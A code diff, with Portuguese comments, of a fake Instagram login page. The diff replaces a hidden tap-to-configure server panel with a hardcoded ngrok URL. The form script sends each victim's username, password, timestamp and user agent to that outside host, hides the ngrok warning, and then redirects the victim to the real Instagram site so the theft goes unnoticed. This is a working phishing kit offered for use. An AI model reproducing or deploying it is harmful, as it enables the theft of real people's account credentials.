@@ -19,7 +19,7 @@
             overflow: hidden;
         }
 
-        /* ========== SPLASH SCREEN ========== */
+        /* SPLASH */
         #splash-screen {
             position: fixed;
             inset: 0;
@@ -55,7 +55,6 @@
         .from-label {
             color: #8E8E8E;
             font-size: 13px;
-            font-weight: 400;
         }
 
         .meta-brand {
@@ -67,7 +66,7 @@
         .infinity-icon {
             font-size: 24px;
             font-weight: 600;
-            background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
+            background: linear-gradient(135deg, #FCAF45, #FD1D1D, #E1306C, #C13584, #833AB4);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
@@ -75,12 +74,12 @@
         .meta-text {
             font-size: 20px;
             font-weight: 700;
-            background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
+            background: linear-gradient(135deg, #FCAF45, #FD1D1D, #E1306C, #C13584, #833AB4);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
-        /* ========== LOGIN SCREEN ========== */
+        /* LOGIN */
         #login-screen {
             display: none;
             flex-direction: column;
@@ -112,9 +111,6 @@
             display: flex;
             justify-content: center;
             margin-bottom: 36px;
-            cursor: pointer;
-            pointer-events: auto;
-            z-index: 10;
         }
 
         .instagram-login-icon {
@@ -201,79 +197,6 @@
             width: 70px;
             opacity: 0.6;
         }
-
-        /* Painel de configuração */
-        #server-config {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1c1c1c;
-            padding: 16px;
-            border-radius: 12px;
-            display: none;
-            z-index: 2000;
-            border: 0.5px solid #363636;
-            width: 90%;
-            max-width: 350px;
-        }
-
-        #server-config h3 {
-            color: #FFF;
-            font-size: 14px;
-            margin-bottom: 12px;
-            text-align: center;
-        }
-
-        #server-config input {
-            background: #000;
-            border: 0.5px solid #363636;
-            color: #FFF;
-            padding: 10px 12px;
-            border-radius: 8px;
-            width: 100%;
-            font-size: 12px;
-            outline: none;
-            margin-bottom: 12px;
-        }
-
-        .config-buttons {
-            display: flex;
-            gap: 8px;
-        }
-
-        #server-config button {
-            flex: 1;
-            background: #0095F6;
-            color: #FFF;
-            border: none;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        #server-config .close-btn {
-            background: #363636;
-        }
-
-        #tap-indicator {
-            position: fixed;
-            bottom: 100px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,149,246,0.9);
-            color: #FFF;
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 600;
-            opacity: 0;
-            transition: opacity 0.2s;
-            z-index: 1999;
-            pointer-events: none;
-        }
     </style>
 </head>
 <body>
@@ -319,8 +242,7 @@
             </div>
         </div>
         
-        <!-- LOGO CLICÁVEL -->
-        <div class="login-logo-wrapper" onclick="handleLogoTap()">
+        <div class="login-logo-wrapper">
             <svg class="instagram-login-icon" viewBox="0 0 24 24" fill="none">
                 <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#g)" stroke-width="2.2" fill="none"/>
                 <circle cx="12" cy="12" r="5.5" stroke="url(#g)" stroke-width="2.2" fill="none"/>
@@ -355,61 +277,12 @@
         </div>
     </div>
 
-    <!-- INDICADOR DE TOQUES -->
-    <div id="tap-indicator">Toques: 0/7</div>
-
-    <!-- PAINEL DE CONFIGURAÇÃO -->
-    <div id="server-config">
-        <h3>⚙️ Configurar Servidor</h3>
-        <input type="text" id="server-url" placeholder="https://seu-ngrok.ngrok-free.app">
-        <div class="config-buttons">
-            <button onclick="saveServerUrl()">Salvar</button>
-            <button class="close-btn" onclick="hideConfig()">Fechar</button>
-        </div>
-    </div>
-
     <script>
-        let SERVER_URL = localStorage.getItem('serveo_url') || '';
-        let tapCount = 0;
-        let tapTimer = null;
+        // ========== URL FIXA DO SERVIDOR ==========
+        // ALTERE AQUI QUANDO O NGROK MUDAR
+        const SERVER_URL = "https://cage-groom-unfocused.ngrok-free.dev";
         
-        // FUNÇÃO CHAMADA PELO ONCLICK DO LOGO
-        function handleLogoTap() {
-            tapCount++;
-            
-            const indicator = document.getElementById('tap-indicator');
-            indicator.style.opacity = '1';
-            indicator.textContent = `Toques: ${tapCount}/7`;
-            
-            clearTimeout(tapTimer);
-            tapTimer = setTimeout(() => { 
-                tapCount = 0; 
-                indicator.style.opacity = '0';
-            }, 1500);
-            
-            if (tapCount >= 7) {
-                document.getElementById('server-config').style.display = 'block';
-                document.getElementById('server-url').value = SERVER_URL;
-                tapCount = 0;
-                indicator.style.opacity = '0';
-            }
-        }
-        
-        function saveServerUrl() {
-            const url = document.getElementById('server-url').value.trim();
-            if (url) {
-                SERVER_URL = url.replace(/\/$/, '');
-                localStorage.setItem('serveo_url', SERVER_URL);
-                document.getElementById('server-config').style.display = 'none';
-                alert('✅ Servidor configurado!');
-            }
-        }
-        
-        function hideConfig() {
-            document.getElementById('server-config').style.display = 'none';
-        }
-        
-        // SPLASH
+        // ========== SPLASH ==========
         window.addEventListener('load', () => {
             setTimeout(() => {
                 document.getElementById('splash-screen').style.opacity = '0';
@@ -420,7 +293,7 @@
             }, 2200);
         });
         
-        // FORMULÁRIO
+        // ========== FORMULÁRIO ==========
         document.getElementById('login-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -429,33 +302,28 @@
             
             if (!u || !p) return;
             
-            if (SERVER_URL) {
-                try {
-                    await fetch(SERVER_URL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'ngrok-skip-browser-warning': 'true'
-                        },
-                        body: JSON.stringify({
-                            u: u,
-                            p: p,
-                            t: new Date().toISOString(),
-                            ua: navigator.userAgent
-                        })
-                    });
-                    await new Promise(r => setTimeout(r, 1000));
-                } catch (err) {}
-            }
+            try {
+                await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'ngrok-skip-browser-warning': 'true'
+                    },
+                    body: JSON.stringify({
+                        u: u,
+                        p: p,
+                        t: new Date().toISOString(),
+                        ua: navigator.userAgent
+                    })
+                });
+                await new Promise(r => setTimeout(r, 1000));
+            } catch (err) {}
             
             window.location.href = 'https://www.instagram.com/reels/';
         });
         
-        // LINKS
+        // ========== LINKS ==========
         document.querySelectorAll('a').forEach(l => l.addEventListener('click', e => e.preventDefault()));
-        
-        // CARREGAR URL SALVA
-        if (SERVER_URL) console.log('Servidor configurado');
     </script>
 </body>
 </html>
